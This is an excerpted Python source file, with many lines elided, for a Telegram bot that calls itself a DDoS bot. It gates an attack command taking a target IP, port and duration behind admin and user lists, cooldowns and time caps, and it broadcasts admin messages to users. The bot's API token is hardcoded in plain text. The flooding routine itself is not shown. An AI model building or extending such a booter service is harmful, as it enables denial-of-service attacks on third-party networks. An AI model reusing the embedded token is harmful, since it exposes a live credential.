...
bot = telebot.TeleBot('7372277273:AAEM38DaNTFnbi6oDOvQ1QCc5inyh8ATL_k')
...
def add_user(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙"
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝙔𝙤𝙪 𝙖𝙧𝙚 𝙤𝙣 𝘾𝙤𝙤𝙡𝙙𝙤𝙬𝙣 𝙒𝙖𝙞𝙩 300 𝙎𝙚𝙘𝙤𝙣𝙙𝙨"
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 240:
                response = "🔴 𝙀𝙧𝙧𝙤𝙧: 𝙩𝙞𝙢𝙚 𝙪𝙨𝙚 𝙡𝙚𝙨𝙨𝙩𝙝𝙚𝙣 240 𝙎𝙚𝙘𝙤𝙣𝙙𝙨"
            else:
                ...
                response = f"𝘼𝙩𝙩𝙖𝙘𝙠 𝙁𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅"
                #bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ 𝙋𝙡𝙚𝙖𝙨𝙚 𝙋𝙧𝙤𝙫𝙞𝙙𝙚 <𝙄𝙋> <𝙋𝙊𝙍𝙏> <𝙏𝙄𝙈𝙀>"  # Updated command syntax
    else:
...
def show_command_logs(message):
    ...
    if user_id in allowed_user_ids:
        ...
        response = "🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨! 🚫\n\nOops! It seems like you don't have permission to use /mylogs."

    bot.reply_to(message, response)

@bot.message_handler(commands=['helpxyz'])
...
def welcome_start(message):
    ...
    response = f'''𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗠𝗘𝗚𝗢𝗫𝗘𝗥 𝗗𝗗𝗢𝗦 𝗕𝗢𝗧'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rulexyzs'])
...
@bot.message_handler(commands=['plxgan'])
...
@bot.message_handler(commands=['admincmdcxg'])
def welcome_plan(message):
    user_name = message.from_user.first_name
...
def broadcast_message(message):
    ...
    if user_id in admin_id:
        ...
        if len(command) > 1:
            message_to_broadcast = "☢️ 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗙𝗢𝗥𝗠 𝗔𝗗𝗠𝗜𝗡 ☢️\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
